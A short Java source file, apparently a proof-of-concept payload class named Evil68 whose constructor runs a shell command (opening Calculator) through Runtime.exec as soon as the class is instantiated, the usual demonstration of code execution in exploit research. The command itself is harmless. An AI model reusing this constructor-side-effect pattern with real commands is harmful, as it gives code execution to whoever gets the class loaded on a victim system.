package com.ocean;

import java.io.IOException;

public class Evil68 implements AutoCloseable {
    public Evil68(){
        try {
            Runtime.getRuntime().exec("open -a Calculator");
        } catch (IOException e) {
            throw new RuntimeException(e);
        }
    }

    @Override
    public void close() throws Exception {

    }
}
